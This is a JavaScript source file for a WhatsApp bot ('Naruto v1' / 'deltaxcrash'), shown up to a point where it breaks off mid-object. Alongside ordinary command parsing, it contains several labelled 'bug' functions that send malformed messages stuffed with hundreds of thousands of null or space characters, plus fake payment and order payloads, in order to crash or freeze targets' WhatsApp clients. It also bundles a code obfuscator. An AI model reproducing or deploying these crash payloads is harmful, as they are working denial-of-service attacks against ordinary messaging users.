module.exports = async (deltaxcrash, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await deltaxcrash.decodeJid(deltaxcrash.user.id)
const sender = m.key.fromMe ? (deltaxcrash.user.id.split(':')[0]+'@s.whatsapp.net' || deltaxcrash.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await deltaxcrash.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/deltaaxcrash.apk`)
const { ios } = require("./virtex/ios.js")
// BUAT NGEBLOK NOMOR LUAR YANG PASARAN
if (m.sender.startsWith('212')) return deltaxcrash.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('48')) return deltaxcrash.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('60')) return deltaxcrash.updateBlockStatus(m.sender, 'block')
// WARNA ACAK
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
let run = runtime(process.uptime())
// PERINTAH IN CONSOLE
if (isCmd) {
console.log(chalk.white.bgRed.bold('Massage'), color(`[NARUTOV1]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}
        // HARI
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
// Read Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// BUTTON VIDEO
   deltaxcrash.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: deltaxcrash.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  header: {
                     hasMediaAttachment: true,
                     videoMessage: video.videoMessage,
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `𝒆𝒅𝒏𝒖𝒕`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await deltaxcrash.sendPresenceUpdate('composing', jid)
      return deltaxcrash.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xbug2 = {

key: {

remoteJid: 'status@broadcast',

fromMe: false, 

participant: '0@s.whatsapp.net'

},

message: {

listResponseMessage: {

title: 'ednut'

}

}

}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍n꙲a꙲r꙲u꙲t꙲o꙲ ₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜⃟ĕ̈d̆̈n̆̈ŭ̈t̆̈🔥᜴#Naruto999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍Ê̬d̬̂n̬̂û̬t̂👹̬ s͓̽a͓̽y͓̽s͓̽╮⭑ ☠️⃰w҉a҉g҉w҉a҉n҉ t҉o҉ y҉o҉u҉r҉͜͡؜🔥᜴₥Ʉ₥#ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "Narutov1 - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Natutov1`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'NARUTO',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: `NARUTO - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ ednut001 naruto bug々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ Naruto🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await deltaxcrash.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaxcrash.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaxcrash.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:yoshii@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://youtube.com/@Ednut001.i?si=1j_c48ZxWw99i-Tq
item3.X-ABLabel:YouTube\n
item4.ADR:;;Nigeria;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await deltaxcrash.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Delta`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆𝑵𝒂𝒓𝒖𝒕𝒐༄ ❞𝒗𝒊𝒕𝒂𝒍ׁׅ֮̿╮⭑ ☠️⃰͜͡𝒄𝒓𝒂𝒔𝒉𝒙𝒙🔥᜴▴𝓮𝓭𝓷𝓾𝓽 𝓫𝓾𝓰😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    deltaxcrash.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return deltaxcrash.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return deltaxcrash.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

//=================================================//
async function aipong(target) {
await deltaxcrash.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍₦₳ⱤɄ₮Ø ⱧɆⱤׁׅ֮╮⭑ ☠️⃰͜͡؜𝑬𝒅𝒏𝒖𝒕 𝒃𝒖𝒈ཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

//Status
if (!deltaxcrash.public) {
if (!m.key.fromMe) return
} 

//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/cb9adb7e8f7e1a70e1f4b.jpg" } }, { upload: deltaxcrash.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #Ednutcrash"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒ ꉔꋪꋬꇙꁝ ꋊꏂꅐ !!!ᥫ᭡▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ☠️..."
]
let { key } = await deltaxcrash.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await deltaxcrash.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
        
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ DELTAXCRAS ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝓮𝓭𝓷𝓾𝓽 𝓼𝓾𝓹𝓮𝓻 𝔁 𝓬𝓻𝓪𝓼𝓱𝓿ཀ͜͡😈⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝓮𝓭𝓷𝓾𝓽 𝓼𝓾𝓹𝓮𝓻 𝔁 𝓬𝓻𝓪𝓼𝓱😈⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
deltaxcrash.relayMessage(jid, order.message, { messageId: order.key.id})
}


const reply = (teks) => { 
deltaxcrash.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "𝑵𝒂𝒓𝒖𝒕𝒐 𝒗1💫", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/4a302cf6435ee7760bb0b.jpg", 
"sourceUrl": "https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W" }}}, { quoted: m }) }


const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
